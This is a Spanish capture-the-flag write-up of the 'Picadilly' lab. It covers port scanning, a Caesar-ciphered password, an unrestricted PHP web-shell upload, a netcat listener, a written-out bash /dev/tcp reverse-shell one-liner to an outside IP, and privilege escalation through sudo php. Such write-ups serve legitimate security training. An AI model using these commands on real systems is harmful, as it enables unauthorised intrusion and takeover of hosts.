# Picadilly
## Reconocimiento
Comienzo con un escaneo de puertos vía `nmap`.
```
❯ nmap -p 0-65535 --open -T5 -A -sT -Pn -n 172.17.0.2 -oX nmapScan.xml && xsltproc nmapScan.xml -o nmapScan.html && open nmapScan.html &>/dev/null & disown
```

![Escaneo de puertos](imgs/1.png)

Esto revela dos servidores HTTP, uno en el puerto 80 y el otro en el 443, el segundo con un certificado SSL.

Al visitar el del puerto 80 me encuentro con el siguiente texto:
```
/// The users mateo password is ////


----------- hdvbfuadcb ------------

"To solve this riddle, think of an ancient Roman emperor and his simple method of shifting letters."

////////////////////////////////////
```
Asumo que se refiere al cifrado César, así que pruebo a decodificarlo y encuentro lo que podría ser la contraseña. Como aparentemente no hay nada más, voy a visitar el del puerto 443.

Parece una especie de foro, la página tiene un formulario de subida de archivos, estos luego se muestran en forma de entrada en el blog.

![Foro con formulario de subida](imgs/2.png)
## Explotación
Subo un archivo llamado `shell.php` y no hay ningún control que me lo impide, este se muestra como entrada del blog con normalidad. Probando el típico directorio donde se pueden ver los archivos visito `/uploads` y ahí está la shell, me pongo en escucha con `nc -nvlp 443` y al clicar en el archivo desde el navegador y volver a la terminal veo que ya estoy dentro como root.

![Shell subida y acceso root](imgs/3.png)
## Post-explotación
En primer lugar, sanitizo la shell

![Sanitización de la shell](imgs/4.png)

Con `cat /etc/passwd`, verifico que el usuario mateo existe, cuando veo que si utilizo la contraseña previamente descifrada para pivotar con éxito

![Pivotando a usuario mateo](imgs/5.png)

Autenticado como mateo, me paso la shell a otra consola para tenerla más limpia.
```sh
bash -i >& /dev/tcp/192.168.1.157/444 0>&1
```

Ya con una terminal en condiciones, miro si hay algún vector de escalada sencillo con `sudo -l`, veo que el binario `php` puede ejecutarse con permisos superiores, una búsqueda rápida en GTFObins y laboratorio resuelto

![Escalada de privilegios con php](imgs/6.png)